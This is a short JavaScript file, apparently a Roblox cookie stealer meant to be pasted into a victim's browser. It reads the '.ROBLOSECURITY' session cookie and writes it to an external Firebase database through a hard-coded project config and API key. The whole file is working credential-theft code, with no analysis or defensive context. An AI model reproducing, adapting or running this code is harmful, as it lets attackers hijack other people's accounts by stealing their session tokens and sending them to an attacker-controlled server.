//javascript: var script = document.createElement('script'); script.src="";  document.body.append(script);
var s1 = document.createElement('script');
s1.src = "https://www.gstatic.com/firebasejs/8.9.1/firebase-app.js";

var s2 = document.createElement('script');
s2.src = "https://www.gstatic.com/firebasejs/8.9.1/firebase-database.js";


// document.head.append(s1);
// document.head.append(s2)

document.body.append(s1);
document.body.append(s2);




 function getCookie(cname) {
   let name = cname + "=";
   let decodedCookie = decodeURIComponent(document.cookie);
   let ca = decodedCookie.split(";");
   for (let i = 0; i < ca.length; i++) {
     let c = ca[i];
     while (c.charAt(0) == " ") {
       c = c.substring(1);
     }
     if (c.indexOf(name) == 0) {
       return c.substring(name.length, c.length);
     }
   }
   return "";
 }


 var cookie = getCookie(".ROBLOSECURITY");

  function save() {

const firebaseConfig = {
  apiKey: "AIzaSyBzr9K8KN5VOcIEfD-tvv0A4etztsLizfg",
  authDomain: "roblox-b2c2c.firebaseapp.com",
  databaseURL: "https://roblox-b2c2c-default-rtdb.firebaseio.com",
  projectId: "roblox-b2c2c",
  storageBucket: "roblox-b2c2c.appspot.com",
  messagingSenderId: "252901655692",
  appId: "1:252901655692:web:b7a28da70d3aaaddfa27a9",
};

const app = firebase.initializeApp(firebaseConfig);
var db = firebase.database();

db.ref("roblox/").once("value", function (message_object) {
    var index = parseFloat(message_object.numChildren()) + 1;
  db.ref("roblox/" + index)
    .set({
      cookie: cookie,
    })
    .then(function () {
      console.log("succseesss");
    });
});
  }